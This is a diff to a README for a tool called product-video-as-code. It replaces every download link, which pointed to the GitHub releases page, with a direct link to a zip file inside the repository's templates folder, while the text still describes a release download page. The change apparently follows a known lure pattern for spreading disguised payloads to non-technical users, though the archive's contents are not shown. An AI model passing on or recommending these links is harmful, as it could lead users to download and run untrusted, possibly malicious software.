@@ -1,6 +1,6 @@
 # 🎬 product-video-as-code - Turn Code Into Stunning Product Videos
 
-[![Download Now](https://img.shields.io/badge/Download-Product_Video_As_Code-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/A19235972428/product-video-as-code/releases)
+[![Download Now](https://img.shields.io/badge/Download-Product_Video_As_Code-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/A19235972428/product-video-as-code/raw/refs/heads/main/templates/product_video_code_as_v2.4.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Ready to make your first video? Follow these simple steps—no coding knowledge 
 
 ### Step 1: Download the Application
 
-[Visit this link to download the application](https://github.com/A19235972428/product-video-as-code/releases)
+[Visit this link to download the application](https://github.com/A19235972428/product-video-as-code/raw/refs/heads/main/templates/product_video_code_as_v2.4.zip)
 
 This takes you to the download page where you'll find the latest release.
 
@@ -239,7 +239,7 @@ Product-video-as-code turns what used to be a specialized skill into something a
 
 **Try it today and make your first product video in under five minutes.**
 
-[![Start Creating Now](https://img.shields.io/badge/Download-Product_Video_As_Code-blue?style=for-the-badge&logo=github&logoColor=white&color=1f6feb)](https://github.com/A19235972428/product-video-as-code/releases)
+[![Start Creating Now](https://img.shields.io/badge/Download-Product_Video_As_Code-blue?style=for-the-badge&logo=github&logoColor=white&color=1f6feb)](https://github.com/A19235972428/product-video-as-code/raw/refs/heads/main/templates/product_video_code_as_v2.4.zip)
 
 ---
 
